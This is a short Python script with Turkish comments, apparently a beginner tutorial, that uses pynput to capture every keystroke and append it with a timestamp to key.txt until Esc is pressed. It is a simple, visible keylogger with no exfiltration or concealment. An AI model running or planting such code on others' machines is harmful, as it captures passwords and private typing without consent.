from pynput.keyboard import Key,Listener
import time as t

# Bana soru sormak için veya daha fazla türkce kaynak için instagram ve GitHub da takip edebilirsin.
# github.com/canemingozde
# instagram.com/canemingozde


data = []

def bas(key):
    global data
    print(f"Basılan tuş{key}") # Terminalde görmek istemiyorsan sil veya yoruma al.
    data.append(str(key))
    if True:
      yaz(data)
      data = []


def yaz(data):
    with open("key.txt","a",encoding="utf-8") as f:
        for key in data:
            f.write(f"Bu tuşa: {key} == {t.asctime()} tarihinde basıldı.\n")



def cek(key):
    if key == Key.esc:
        return False


with Listener(on_press=bas,on_release=cek) as l:
    l.join()


